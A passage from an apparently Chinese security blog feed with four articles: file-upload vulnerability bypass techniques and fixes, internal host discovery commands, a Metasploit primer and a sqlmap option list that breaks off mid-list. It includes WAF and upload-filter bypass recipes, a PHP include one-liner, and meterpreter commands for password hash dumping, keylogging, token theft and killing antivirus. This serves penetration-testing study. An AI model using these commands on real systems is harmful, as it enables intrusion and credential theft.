    <content type="text"><![CDATA[本文研究文件上传漏洞原理、产生原因、绕过姿势及防御方法 0x01 漏洞简介文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力，代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验 这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等，这种攻击方式是最为直接和有效的，是getshell最快最直接的方法之一0x02 威胁场景123456789(1) 上传文件是Web脚本语言，Web服务器解释并执行了用户上传的脚本，导致代码执行(2) 上传文件是病毒或者木马时，可用于诱骗用户或者管理员下载执行或者直接自动运行(3) 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(4) 上传文件是钓鱼图片或包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈(5) 上传一个合法的文本文件，其内容包含了PHP脚本，再通过&quot;本地文件包含漏洞(Local File Include)&quot;执行此脚本 0x03 触发条件12345(1) 上传的文件能够被Web容器解释执行，文件上传后所在的目录需是Web容器所覆盖到的路径(2) 上传的文件能够从Web上访问(3) 上传的文件未被安全检查、格式化、图片压缩等功能改变内容 0x04 漏洞成因12345678910111.服务器配置不当2.开源编辑器上传漏洞3.本地文件上传限制被绕过4.过滤不严或被绕过5.文件解析漏洞导致文件执行6.文件路径截断 0x05 漏洞原理大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本 当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，用于getshell。根据具体漏洞的差异，上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本0x06 检测防御当一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据，针对文件上传过程检测校验措施如下 1. 客户端校验1通过javascript来校验上传文件的后缀是否合法，可以采用白名单/黑名单的方式；在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包 2. 服务端校验1234567891011121314151617181920211) 文件头content-type字段校验（image/gif）2) 文件内容头校验，通过正则匹配来判断文件幻数(文件头)内容是否符合要求，常见的文件头（文件头标志位）如下: a) .JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00） b）.gif，”GIF89A”（474946383961） c）.zip，”ZipCompressed”（504B0304） d）.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE13）目录路经检测（检测跟Path参数相关的内容）4）文件扩展名检测(检测跟文件extension 相关的内容)5）后缀名黑名单校验6）后缀名白名单校验7）自定义正则校验 3. WAF校验使用不同的WAF产品来进行过滤，通常是独立于服务程序的一段中间程序或者硬件 0x07 绕过姿势1. 客户端绕过12345671. 通过火狐插件NOscript插件或者禁用IE中JS脚本2. 通过firbug插件元素审核修改代码（如删除onsubm:t=”return checkFile()”事件）3. 通过firbug元素审核javascirpt脚本中添加上传文件类型4. 通过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名，请求头中的Content-Length的值也要修改 2. 服务端绕过(1) 黑名单扩展名绕过 12345678910111213141) 利用黑名单未包含的扩展名进行绕过：如iis6.0中的asa 和cer，2) 黑名单特殊后缀名绕过：pht, phpt, phtml, php3,php4,php5,php6，需满足http.conf中设置AddTypeapplication/x-httpd-php .php1(php的版本小于等于5.3.29以下)2）利用可能存在大小写绕过漏洞：如aSp(iis6.0中）和pHp（能在小于php5.3.39中的linux中）3）利用能被WEB容器解析的文件其他扩展名列表绕过 jsp,jspx ,jspfasp asa cer cdx,htr,xml,html aspx,ashx,asmx,asax,ascx (2) 利用系统文件命名规则绕过 1231) windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”不空格，利用此特性也可以绕过黑名单验证；apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过2）linux中当php版本小于php5.3.39，可用pHp大小写绕过 (3) 服务端MIME文件类型(Content-Type)绕过 123456789101112131415161718192021222324251）MIME作用使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类，web客户端使用MIME来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式癿重要标记项2）常用文件上传类型的MIME表: text/plain（纯文本） text/html（HTML文档） text/javascript（js代码） application/xhtml+xml（XHTML文档） image/gif（GIF图像） image/jpeg（JPEG图像） image/png（PNG图像） video/mpeg（MPEG动画） application/octet-stream（二进制数据） application/pdf（PDF文档） application/(编程语言) 该种语言的代码 application/msword（Microsoft Word文件） message/rfc822（RFC 822形式） multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示） application/x-www-form-urlencoded（POST方法提交癿表单）multipart/form-data（POST提交时伴随文件上传的表单）3）绕过方法上传对文件类型做了限制，可通过burpsuit将其他类文件类型修改为如：Content-Type：image/gif和image/jpeg等运行的文件类型 (4) 利用文件包含漏洞绕过 123456789101112131) 运行上传文件包含脚本木马和一句话木马 前提：校验规则只校验当文件后缀名为asp/php/jsp癿文件内容是否为木马 (a) 先上传一个内容为木马癿txt后缀文件，因为后缀名的关系没有检验内容； (b) 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt; 此时，这个php文件就会去引用txt文件的内容，从而绕过校验(2) 存在本地文件包含漏洞，并可上传一句话内容马 上传一个符合条件格式的文档，文档内容为一句话木马，利用文件包含漏洞包含上传癿木马文件 3. 白名单绕过(1) 利用web服务器解析漏洞 12345671) nginx空字节漏洞xxx.jpg%00.php 这样的文件名会被解析为php代码运行2）apache解析漏洞上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别癿，因此就会直接将类型识别为php，从而达到注入php代码的目的 (2) .htaccess 文件重写绕过 123.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录访问、禁止目录列表、配置默认文档等功能配合黑名单列表绕过，上传一个自定义的.htaccess和一句话图片木马，可绕过各种检测 (3) 文件头检测绕过 1234567文件头过滤主要是通过验证图片的文件头的方式来判断是不是图片文件，针对这种情况，在要上传文件的文件头里面加上图片文件头即可绕过；如图片文件是否文件头含有gif89,可以通过一句话图片木马生成工具edjpgcom或者通过编辑器在木马内容基础上再加一些文件信息不同的图片文件都有不同文件头，如： PNG：文件头标识(8 bytes) 89 50 4E 47 0D 0A 1A 0A JPEG：文件头标识(2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识) GIF：文件头标识(6 bytes) 4749 46 38 39(37) 61 (4) CMS、编辑器漏洞绕过CMS漏洞 1234针对不同CMS存在的上传漏洞进行绕过编辑器漏洞：如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过 (5) 对渲染/加载测试攻击内容检查绕过 通过向图片中加入代码注入，这里一般为一句话图片木马，可能正常访问图片4. WAF绕过(1) WAF检查的位置 1234567891011文件名：解析文件名，判断是否在黑名单内文件内容：解析文件内容，判断是否为webshell文件目录权限请求的urlBoundary边界MIME文件类型 (2) 绕过WAF方法 123456789101112131415161718192021222324252627282930313233343536373839404142431) 填充垃圾数据绕过有些主机WAF软件会对校验的用户数据设置大小上限，此种情况可以构造一个大文件，在木马内容前填充垃圾内容，可以绕过WAF对文件内容的校验; 可在Content-Type类型数据后添加垃圾数据，也可以将垃圾数据放在数据包最开头、绕过对文件名的校验2) POST/GET的更改方法绕过有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET3) 删除实体里面的Conten-Type字段绕过4) 删除Content-Disposition字段里的空格绕过5) 修改Content-Disposition字段值的大小写绕过 6) 文件扩展名出回车绕过（只支持php）7) 利用NTFS ADS特性绕过ADS是NTFS磁盘格式的一个特性，用亍NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过8) 文件重命名绕过如果web程序会将filename除了扩展名的那段重命名的话，可以构造更多的点、符号等绕过9) 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长10) 引号去掉，双引号变单引号绕过11) 删除Content-Disposition值的form-data绕过12) 多个分号绕过当WAF遇到name=&quot;myfile&quot;;;时，认为没有解析到filename。而后端容器继续解析到的文件名是bk.php，导致WAF被绕过13) name和filename添加任意字符串(长度大于等于508）14) head头的content-type：tab绕过15) head头的content-type: multipart/form-data改成大写绕过16) head头的Content-Type: multipart/form-data;\n绕过 0x08 漏洞修复12345678910111213141516171819(1) 将文件上传的目录设置为不可执行：只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响(3) 文件类型检查(白名单)在判断文件类型时，可以结合使用MIME Type、后缀检查等方式，在文件类型检查中，推荐白名单方式；此外对于图片的处理可使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码(4) 改写文件名和文件路径文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本(4) 本地文件上传限制被绕过：在服务器后端对上传的文件进行过滤(5) 单独设置文件服务器的域名由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript癿XSS利用等问题将得到解决(6) 开源编辑器上传漏洞更新编辑器版本,修复已知漏洞]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Vulner</tag>
        <tag>Execution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网存活主机发现姿势小结]]></title>
    <url>%2Fposts%2F10803%2F</url>
    <content type="text"><![CDATA[本文总结通过各类协议、工具发现内网存活主机的姿势... 0x01 基于ARP发现内网存活主机ARP协议 1地址解析协议（英文：Address Resolution Protocol，缩写：ARP）是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，根据IP地址获取物理地址。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址 1. nmap扫描1$ nmap -sn -PR 192.168.1.1/24 2. msf扫描msf &gt; use auxiliary/scanner/discovery/arp_sweep msf auxiliary(arp_sweep) &gt; set RHOSTS 192.168.1.0/24 msf auxiliary(arp_sweep) &gt; set THREADS 16 msf auxiliary(arp_sweep) &gt; run3. arp-scan123$ yum -y install arp-scan //安装$ arp-scan --interface=eth0 --localnet //发现本地网络上所有主机 4. powershellc:&gt;powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;5. netdiscover$ netdiscover -r 192.168.1.0/24 -i wlan00x02 基于ICMP发现内网存活主机ICMP协议 1ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 1. nmap扫描$ nmap -sP -PI -T4 192.168.0.1/242. ping123451) Windows扫描for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|findstr /i &quot;ttl=&quot;2）Linux扫描for i in $( seq 1 255);do ping -c 1 192.168.0.$i|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &apos;&#123;print $4&#125;&apos;; done 3. fping常用参数 123456789-a：只显示存活主机；-u：只显示不存活主机；-l：循环ping-g：指定扫描范围-f：扫描IP列表文件 扫描实战 123$ fping -af iplist //从文件中扫描存活主机$ fping -g IP1 IP2 //IP1地址开始范围，IP2地址结束范围 powershell123powershell.exe ‐exec bypass ‐Command &quot;Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135&quot; tcpingtcping.exe ‐n 1 192.168.1.0 800x03 基于UDP发现内网存活主机UDP协议 1用户数据报协议（英语：User Datagram Protocol，缩写：UDP；又称用户数据包协议）是一个简单的面向数据报的通信协议，位于OSI模型的传输层；UDP报文没有可靠性保证、顺序保证和流量控制字段等，可靠性较差，但在数据传输过程中延迟小、数据传输效率高，适合对可靠性要求不高的应用程序 1. msf扫描12msf &gt; use auxiliary/scanner/discovery/udp_probemsf &gt; use auxiliary/scanner/discovery/udp_sweep 2. unicornscan1$ unicornscan -mU 192.168.1.1 3. nmap1$ nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500 0x04 基于snmp发现内网存活主机SNMP协议 1SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息 1. nmap扫描1$ nmap -sU --script snmp-brute 192.168.1.0/24 -T4 2. msf扫描1msf &gt; use auxiliary/scanner/snmp/snmp_enum 0x05 基于netbios发现内网存活主机netbios协议 1该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能；系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享 1. nmap扫描1$ nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 2. msf扫描1msf &gt; use auxiliary/scanner/netbios/nbname 3. nbtscan扫描123$ nbtscan -r 192.168.1.0/24$ nbtscan -v -s: 192.168.1.0/24]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
        <tag>Discovery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metsploit基础篇]]></title>
    <url>%2Fposts%2F16803%2F</url>
    <content type="text"><![CDATA[本文总结渗透测试框架Metsploit基本使用方法... 0x01 基本介绍1. 架构图 2. 目录结构源码结构 12345678910111213141516171819202122232425├── bin│ ├── msfbinscan│ ├── msfconsole│ ├── msfd│ ├── msfdb│ ├── msfelfscan│ ├── msfmachscan│ ├── msfpescan│ ├── msfremove│ ├── msfrop│ ├── msfrpc│ ├── msfrpcd│ ├── msfupdate│ └── msfvenom├── embedded│ ├── bin│ ├── framework│ ├── include│ ├── lib│ ├── share│ └── ssl├── LICENSE├── LICENSES├── version-manifest.json└── version-manifest.txt Metasploit框架 1234567891011121314151617181920212223242526272829301）framework目录$ tree -L 1 /opt/metasploit-framework/embedded/framework.|-- config //metasploit的环境配置信息，数据库配置信息|-- data //存放meterpreter，exploits，wordlists等数据信息|-- external //metasploit的一些基础扩展模块|-- lib //metasploit的一些基础类和第三方模块类|-- modules //metasploit模块|-- msfconsole //metasploit的基本命令行|-- msfd //metasploit服务|-- msfrpc //metasploit的服务端|-- msfrpcd //持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务|-- msfupdate //metasploit更新模块|-- msfvenom //集成了msfpayload和msfencode的功能，效率更高|-- plugins //metasploit的第三方插件接口|-- scripts //存放一些msf用到的脚本，如meterpreter，ps，resource，shell|-- tools //第三方脚本工具2）Metasploit模块$ tree -L 2 /opt/metasploit-framework/embedded/framework/modules.|-- auxiliary //辅助模块:包含端口扫描器、嗅探器、fuzzers、暴力破解等|-- encoders //编码器模块:对payload进行编码加密，绕过杀软|-- evasion //检测规避模块|-- exploits //漏洞利用模块:对某些可能存在漏洞的目标进行漏洞利用|-- nops //空指令模块:不影响进程运行的空命令或无关命令，用于填充|-- payloads //攻击载荷:攻击成功后在目标机执行的代码，如反弹shell、bind shell等`-- post //后渗透模块:用于内网渗透 0x02 常用命令1. 基础命令123456789101112131415show exploits – 查看所有可用的渗透攻击程序代码 show auxiliary – 查看所有可用的辅助攻击工具 show options – 查看该模块所有可用选项 show payloads – 查看该模块适用的所有载荷代码 show targets – 查看该模块适用的攻击目标类型search – 根据关键字搜索某模块 info – 显示某模块的详细信息exploit - 漏洞利用 use – 进入使用某渗透攻击模块 back – 回退 check - 检查目标是否可漏洞利用grep - 匹配指定内容set/unset – 设置/禁用模块中的某个参数 setg/unsetg – 设置/禁用适用于所有模块的全局参数 save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用 命令示例 123456789101112131415msf &gt; grep http search mysqlmsf &gt; search name:mysql //根据名称搜索msf &gt; search platform:linux //搜索指定平台模块msf &gt; search type:post //根据auxiliary, post, exploit等模块类型进行搜索msf &gt; search cve:2019 type:exploit platform:linux //组合搜索msf exploit(3proxy) &gt; sessions -l //列出活动的会话msf exploit(3proxy) &gt; sessions -i 1 //指定会话ID进行交互msf exploit(3proxy) &gt; sessions -s checkvm -i 2-4 //在指定会话上执行脚本 2. Meterpreter命令123456789101112131415161718192021222324252627282930313233343536meterpreter &gt; background 放回后台meterpreter &gt; exit 关闭会话meterpreter &gt; help 帮助信息meterpreter &gt; Sysinfo系统平台信息meterpreter &gt; screenshot 屏幕截取meterpreter &gt; shell 命令行shell (exit退出)meterpreter &gt; getlwd 查看本地目录meterpreter &gt; lcd 切换本地目录meterpreter &gt; getwd 查看目录meterpreter &gt; ls 查看文件目录列表meterpreter &gt; cd 切换目录 meterpreter &gt; rm 删除文件 meterpreter &gt; download /data/1.txt 1.txt 下载文件meterpreter &gt; upload /var/www/wce.exe wce.exe 上传文件meterpreter &gt; search -d c: -f *.doc 搜索文件meterpreter &gt; execute -f cmd.exe -i 执行程序/命令 meterpreter &gt; ps 查看进程meterpreter &gt; run post/windows/capture/keylog_recorder 键盘记录meterpreter &gt; getuid 查看当前用户权限meterpreter &gt; use priv 加载特权模块meterpreter &gt; getsystem 提升到SYSTEM权限meterpreter &gt; hashdump 导出密码散列meterpreter &gt; ps 查看高权限用户PIDmeterpreter &gt; steal_token &lt;PID&gt; 窃取令牌meterpreter &gt; rev2self 恢复原来的令牌 meterpreter &gt; migrate pid 迁移进程meterpreter &gt; run killav 关闭杀毒软件 meterpreter &gt; run getgui-e 启用远程桌面meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt; 端口转发meterpreter &gt; run get_local_subnets 获取内网网段信息meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由meterpreter &gt; run autoroute -p 查看自动路由表创建代理通道:msf &gt; use auxiliary/server/socks4a 设置socks4代理模块msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; run 0xFF 参考资源 https://metasploit.help.rapid7.com/docs https://github.com/rapid7/metasploit-framework/wiki https://www.offensive-security.com/metasploit-unleashed/introduction/]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Metsploit</tag>
        <tag>Red Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap基础备忘录]]></title>
    <url>%2Fposts%2F30803%2F</url>
    <content type="text"><![CDATA[本文介绍Sql注入自动化工具-Sqlmap常用参数及实用技巧... 0x01 选项1234567891011Usage: python sqlmap.py [options]Options（选项）:-h, ## 展示帮助文档参数-hh ## 展示详细帮助文档参数--version ## 显示程序的版本号-v ## 详细级别：0-6（默认为1） 0x02 目标1234567891011121314151617Target（目标）:-d ## 指定具体数据库-u URL ## 目标URL (e.g. &quot;http://www.example.com/test.php?id=1&quot;)-l ## 解析目标(s)从Burp或WebScarab代理日志文件-x ## 从远程站点地图文件(.xml)解析目标-m ## 扫描文本文件中给出的多个目标-r ## 从本地文件加载HTTP请求 ，多用于post注入-g ## 处理Google的结果作为目标URL-c ## 从INI配置文件中加载选项 0x03 请求12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Request（请求）: 这些选项可以用来指定如何连接到目标URL--method=METHOD ## 强制使用给定的HTTP方法（e.g. POST）--data=DATA ## 通过POST发送的数据字符串--param-del=PARA.. ## 用于拆分参数值的字符--cookie=COOKIE ## Cookie头的值--cookie-del=COO.. ## 用于分割Cookie值的字符--load-cookies=L.. ## 包含Netscape/wget格式的cookie的文件--drop-set-cookie ## 从响应中忽略Set-Cookie头--user-agent=AGENT ## 指定 HTTP User - Agent头--random-agent ## 使用随机选定的HTTP User - Agent头--host=HOST ## HTTP主机头值--referer=REFERER ## 指定 HTTP Referer头-H HEADER, --hea.. ## 额外header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)--headers=HEADERS ## 额外header (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)--auth-type=AUTH.. ## 认证类型(Basic, Digest, NTLM or PKI)--auth-cred=AUTH.. ## HTTP认证凭证(name:password)--auth-file=AUTH.. ## HTTP认证 PEM认证/私钥文件--ignore-401 ## 忽略HTTP错误401--proxy=PROXY ## 使用代理连接到目标网址--proxy-cred=PRO.. ## 代理认证证书(name:password)--proxy-file=PRO.. ## 从文件中加载代理列表--ignore-proxy ## 忽略系统默认代理设置--tor ## 使用Tor匿名网络--tor-port=TORPORT ## 设置Tor代理端口而不是默认值--tor-type=TORTYPE ## 设置Tor代理类型--check-tor ## 检查Tor是否正确使用--delay=DELAY ## 每个HTTP请求之间的延迟（秒）--timeout=TIMEOUT ## 秒超时连接前等待（默认30）--retries=RETRIES ## 连接超时时重试（默认值3）--randomize=RPARAM ## 随机更改给定参数的值(s)--safe-url=SAFEURL ## 在测试期间频繁访问的URL地址--safe-post=SAFE.. ## POST数据发送到安全URL--safe-req=SAFER.. ## 从文件加载安全HTTP请求--safe-freq=SAFE.. ## 在两次访问给定安全网址之间测试请求--skip-urlencode ## 跳过有效载荷数据的URL编码--csrf-token=CSR.. ## 参数用于保存anti-CSRF令牌--csrf-url=CSRFURL ## 提取anti-CSRF URL地址访问令牌--force-ssl ## 强制使用SSL /HTTPS--hpp ## 使用HTTP参数pollution的方法--eval=EVALCODE ## 评估请求之前提供Python代码(如&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) 0x04 性能优化1234567891011Optimization（优化）: 这些选项可用于优化sqlmap的性能-o ## 开启所有优化开关--predict-output ## 预测常见的查询输出--keep-alive ## 使用持久的HTTP（S）连接--null-connection ## 从没有实际的HTTP响应体中检索页面长度--threads=THREADS ## 最大的HTTP（S）请求并发量（默认为1） 0x05 注入12345678910111213141516171819202122232425262728293031Injection（注入）: 用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本-p ## 可测试的参数（S）--skip=SKIP ## 跳过对给定参数的测试--skip-static ## 跳过测试不显示为动态的参数--param-exclude=.. ## 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）--dbms=DBMS ## 强制后端的DBMS为此值--dbms-cred=DBMS.. ## DBMS认证凭证(user:password)--os=OS ## 强制后端的DBMS操作系统为这个值--invalid-bignum ## 使用大数字使值无效--invalid-logical ## 使用逻辑操作使值无效--invalid-string ## 使用随机字符串使值无效--no-cast ## 关闭有效载荷铸造机制--no-escape ## 关闭字符串转义机制--prefix=PREFIX ## 注入payload字符串前缀--suffix=SUFFIX ## 注入payload字符串后缀--tamper=TAMPER ## 使用给定的脚本（S）篡改注入数据 0x06 检测1234567891011121314151617Detection（检测）: 用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容--level=LEVEL ## 执行测试的等级（1-5，默认为1）--risk=RISK ## 执行测试的风险（0-3，默认为1）--string=STRING ## 查询时有效时在页面匹配字符串--not-string=NOT.. ## 当查询求值为无效时匹配的字符串--regexp=REGEXP ## 查询时有效时在页面匹配正则表达式--code=CODE ## 当查询求值为True时匹配的HTTP代码--text-only ## 仅基于在文本内容比较网页--titles ## 仅根据他们的标题进行比较 0x07 技巧123456789101112131415Techniques（技巧）: 用于调整具体的SQL注入测试。--technique=TECH ## SQL 注入技术测试（默认BEUST）--time-sec=TIMESEC ## DBMS响应的延迟时间（默认为5秒）--union-cols=UCOLS ## 定列范围用于测试UNION查询注入--union-char=UCHAR ## 用于暴力猜解列数的字符--union-from=UFROM ## 要在UNION查询SQL注入的FROM部分使用的表--dns-domain=DNS.. ## 域名用于DNS漏出攻击--second-order=S.. ## 生成页面的URL搜索为second-order响应 0x08 指纹123Fingerprint（指纹）-f ## 执行检查广泛的DBMS版本指纹 0x09 枚举123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869Enumeration（枚举）: 用来列举后端数据库管理系统的信息、表中的结构和数据，还可以运行自己的SQL语句-a, ## 检索一切-b, ## 检索数据库管理系统的标识--current-user ## 检索数据库管理系统的标识--current-db ## 检索数据库管理系统当前数据库-hostname ## 检索数据库服务器的主机名--is-dba ## 检测DBMS当前用户是否DBA--users ## 枚举数据库管理系统用户--passwords ## 枚举数据库管理系统用户密码哈希--privileges ## 枚举数据库管理系统用户的权限--roles ## 枚举数据库管理系统用户的角色--dbs ## 枚举数据库管理系统数据库--tables ## 枚举的DBMS数据库中的表--columns ## 枚举DBMS数据库表列--schema ## 枚举数据库架构--count ## 检索表的条目数--dump ## 转储数据库管理系统的数据库中的表项--dump-all ## 转储数据库管理系统的数据库中的表项--search ## 搜索列（S），表（S）和/或数据库名称（S）--comments ## 检索数据库的comments(注释、评论)-D DB ## 要进行枚举的数据库名-T TBL ## 要进行枚举的数据库表-C COL ## 要进行枚举的数据库列-X EXCLUDECOL ## 不进行枚举的数据库列-U USER ## 用来进行枚举的数据库用户--exclude-sysdbs ## 枚举表时排除系统数据库--pivot-column=P.. ## 主列名称--where=DUMPWHERE ## 使用WHERE条件进行表转储--start=LIMITSTART ## 第一个查询输出进入检索--stop=LIMITSTOP ## 最后查询的输出进入检索--first=FIRSTCHAR ## 第一个查询输出字的字符检索--last=LASTCHAR ## 最后查询的输出字字符检索--sql-query=QUERY ## 要执行的SQL语句--sql-shell ## 提示交互式SQL的shell--sql-file=SQLFILE ## 从给定文件执行SQL语句 0x0A 蛮力检查12345Brute force（蛮力）: 可以被用来运行蛮力检查--common-tables ## 检查存在共同表--common-columns ## 检查存在共同列 0x0B 访问操作访问文件系统 12345678File system access（访问文件系统）: 可以被用来访问后端数据库管理系统的底层文件系统--file-read=RFILE ## 从后端的数据库管理系统文件系统读取文件--file-write=WFILE ## 编辑后端的数据库管理系统文件系统上的本地文件--file-dest=DFILE ## 后端的数据库管理系统写入文件的绝对路径 操作系统访问 123456789101112131415161718Operating system access（操作系统访问）: 可以用于访问后端数据库管理系统的底层操作系统--os-cmd=OSCMD ## 执行操作系统命令--os-shell ## 交互式的操作系统的shell--os-pwn ## 获取一个OOB shell，meterpreter或VNC--os-smbrelay ## 一键获取一个OOB shell，meterpreter或VNC--os-bof ## 存储过程缓冲区溢出利用--priv-esc Database process user privilege escalation## 数据库进程用户权限提升--msf-path=MSFPATH ## 本地的安装路径--tmp-path=TMPPATH ## 远程临时文件目录的绝对路径 Windows注册表访问 123456789101112131415Windows registry access（Windows注册表访问）: 可以被用来访问后端数据库管理系统Windows注册表。--reg-read ## 读一个Windows注册表项值--reg-add ## 写一个Windows注册表项值数据--reg-del ## 删除Windows注册表键值--reg-key=REGKEY ## Windows注册表键--reg-value=REGVAL ## Windows注册表项值--reg-data=REGDATA ## Windows注册表键值数据--reg-type=REGTYPE ## Windows注册表项值类型 0x0C 常用参数12345678910111213141516171819202122232425262728293031323334353637383940414243General : 可以用来设置一些一般的工作参数-s SESSIONFILE ## 保存和恢复检索会话文件的所有数据-t TRAFFICFILE ## 记录所有HTTP流量到一个文本文件中--batch ## 从不询问用户输入，使用所有默认配置--binary-fields=.. ## 具有二进制值的结果字段--charset=CHARSET ## 强制用于数据检索的字符编码--crawl=CRAWLDEPTH ## 从目标网址开始抓取网站--crawl-exclude=.. ## 正则表达式排除网页抓取--csv-del=CSVDEL ## 分隔CSV输出中使用的字符--dump-format=DU.. ## 转储数据的格式 (CSV (default), HTML or SQLITE)--eta ## 显示每个输出的预计到达时间--flush-session ## 刷新当前目标的会话文件--forms ## 在目标网址上解析和测试表单--fresh-queries ## 忽略在会话文件中存储的查询结果--hex ## 使用DBMS hex函数进行数据检索--output-dir=OUT.. ## 自定义输出目录路径--parse-errors ## 解析和显示响应中的DBMS错误消息--save=SAVECONFIG ## 保存选项到INI配置文件--scope=SCOPE ## 使用正则表达式从提供的代理日志中过滤目标--test-filter=TE.. ## 根据有效负载和/或标题(e.g. ROW)选择测试--test-skip=TEST.. ## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）--update ## 更新SqlMap 0x0D 杂项1234567891011121314151617181920212223242526272829303132333435Miscellaneous（杂项）:-z ## 使用简短的助记符 (如 &quot;flu,bat,ban,tec=EU&quot;)--alert=ALERT ## 在找到SQL注入时运行主机操作系统命令--answers=ANSWERS ## 设置问题答案--beep ## 发现SQL 注入时提醒--cleanup ## 具体的UDF和表清理DBMS--dependencies ## 检查是否缺少（非内核）sqlmap依赖关系--disable-coloring ## 禁用控制台输出颜色--gpage=GOOGLEPAGE ## 使用Google dork结果指定页码--identify-waf ## 对WAF/IPS/IDS保护进行全面测试--skip-waf ## 跳过启发式检测WAF/IPS/IDS保护--mobile ## 通过HTTP User-Agent标头模仿智能手机--offline ## 在离线模式下工作（仅使用会话数据）--page-rank ## Google dork结果显示网页排名（PR）--purge-output ## 安全地从输出目录中删除所有内容--smart ## 只有在正启发式时才进行彻底测试--sqlmap-shell ## 